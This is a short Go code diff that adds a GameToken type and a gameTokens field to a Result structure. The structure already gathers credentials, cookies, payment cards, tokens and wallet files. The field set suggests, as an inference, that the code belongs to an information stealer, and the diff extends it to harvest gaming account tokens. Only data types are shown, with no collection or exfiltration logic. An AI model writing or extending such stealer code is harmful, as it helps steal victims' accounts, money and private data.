@@ -35,12 +35,20 @@ type WalletFile struct {
 	DataB64  string `json:"dataB64"`
 }
 
+type GameToken struct {
+	Game     string `json:"game"`
+	Type     string `json:"type"`
+	Username string `json:"username"`
+	Value    string `json:"value"`
+}
+
 type Result struct {
 	Credentials []Credential `json:"credentials"`
 	Cookies     []Cookie     `json:"cookies"`
 	Cards       []Card       `json:"cards"`
 	Tokens      []string     `json:"tokens"`
 	Wallets     []WalletFile `json:"wallets"`
+	GameTokens  []GameToken  `json:"gameTokens"`
 	Errors      []string     `json:"errors"`
 }
 
